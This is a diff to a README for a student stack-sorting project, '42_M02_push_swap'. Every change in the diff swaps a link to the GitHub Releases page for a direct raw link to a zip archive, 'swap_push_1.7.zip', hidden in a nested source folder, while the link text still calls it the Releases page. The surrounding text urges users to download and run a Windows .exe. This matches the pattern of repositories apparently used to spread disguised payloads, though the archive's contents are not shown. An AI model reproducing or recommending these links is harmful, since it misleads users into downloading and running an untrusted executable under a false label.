@@ -1,6 +1,6 @@
 # 🧮 42_M02_push_swap - Efficient Stack Sorting Tool
 
-[![Download 42_M02_push_swap](https://img.shields.io/badge/Download-42_M02_push_swap-4caf50?style=for-the-badge&logo=github)](https://github.com/able-planking449/42_M02_push_swap/releases)
+[![Download 42_M02_push_swap](https://img.shields.io/badge/Download-42_M02_push_swap-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip)
 
 ---
 
@@ -44,13 +44,13 @@ No complicated setup or options are required to run the basic functions.
 
 Before running the program, download the latest release from the official GitHub page.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/able-planking449/42_M02_push_swap/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip)
 
 ---
 
 ## 📥 Download and Installation Instructions
 
-1. Visit the [42_M02_push_swap Releases page](https://github.com/able-planking449/42_M02_push_swap/releases).  
+1. Visit the [42_M02_push_swap Releases page](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip).  
 
 2. On the page, find the latest release. Look for a file named something like `42_M02_push_swap_win.exe` or similar.  
 
@@ -122,7 +122,7 @@ The goal is to apply these steps to the original stack to end up with a sorted l
 
 To update the program:
 
-1. Check the [Releases page](https://github.com/able-planking449/42_M02_push_swap/releases) regularly for new versions.  
+1. Check the [Releases page](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip) regularly for new versions.  
 2. Download the latest `.exe` file as before.  
 3. Replace the old file with the new one. You can simply overwrite it in your download folder or preferred location.  
 4. Run the new executable following the same steps.  
